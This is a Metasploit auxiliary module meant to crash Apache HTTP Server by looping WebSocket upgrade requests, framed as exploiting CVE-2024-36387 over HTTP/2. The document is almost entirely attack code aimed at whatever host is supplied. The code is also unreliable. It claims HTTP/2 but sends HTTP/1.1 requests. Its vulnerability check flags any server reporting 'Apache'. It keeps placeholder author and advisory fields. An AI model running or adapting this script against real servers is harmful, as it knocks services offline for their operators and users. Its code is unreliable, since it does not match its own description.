##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
    include Msf::Exploit::Remote::HttpClient
  
    def initialize(info = {})
      super(update_info(info,
        'Name'           => 'Apache HTTP Server WebSocket over HTTP/2 DoS',
        'Description'    => %q{
          This module exploits a null pointer dereference vulnerability in Apache HTTP Server
          when handling WebSocket protocol upgrades over an HTTP/2 connection. This can cause
          the server process to crash, resulting in a denial of service condition.
        },
        'Author'         =>
          [
            'Your Name'  # Your name or handle
          ],
        'License'        => MSF_LICENSE,
        'References'     =>
          [
            ['CVE', '2024-36387'],
            ['URL', 'https://example.com/advisory'] # Replace with an advisory link if available
          ],
        'DisclosureDate' => 'Aug 03 2024'
      ))
  
      register_options(
        [
          Opt::RHOSTS,
          Opt::RPORT(443),
          OptString.new('TARGETURI', [ true, "The base path to the vulnerable application", '/']),
          OptBool.new('SSL', [ true, 'Negotiate SSL/TLS for outgoing connections', true ]),
          OptInt.new('DELAY', [ true, 'Delay between requests in seconds', 1 ])
        ])
    end
  
    def check
      res = send_request_cgi({
        'method' => 'GET',
        'uri'    => normalize_uri(target_uri.path),
      })
  
      if res && res.headers['Server'] && res.headers['Server'].include?('Apache')
        return Exploit::CheckCode::Appears
      end
  
      Exploit::CheckCode::Safe
    end
  
    def run
      begin
        print_status("Sending WebSocket upgrade requests to #{datastore['RHOSTS']}:#{datastore['RPORT']}#{target_uri.path}")
        websocket_upgrade_request = {
          'method'  => 'GET',
          'uri'     => normalize_uri(target_uri.path),
          'version' => '1.1',
          'headers' => {
            'Host' => datastore['RHOSTS'],
            'Upgrade' => 'websocket',
            'Connection' => 'Upgrade',
            'Sec-WebSocket-Key' => 'dGhlIHNhbXBsZSBub25jZQ==',
            'Sec-WebSocket-Version' => '13'
          }
        }
  
        loop do
          res = send_request_raw(websocket_upgrade_request)
  
          if res && res.code == 101
            print_good('Successfully sent WebSocket upgrade request')
          else
            print_error("Failed to send WebSocket upgrade request: #{res.inspect}")
          end
  
          sleep(datastore['DELAY'])
        end
      rescue ::Rex::ConnectionError => e
        print_error("Connection failed: #{e.message}")
      rescue ::Interrupt
        print_status("User interrupted the module execution")
      rescue ::Exception => e
        print_error("An unexpected error occurred: #{e.message}")
      end
    end
  end
  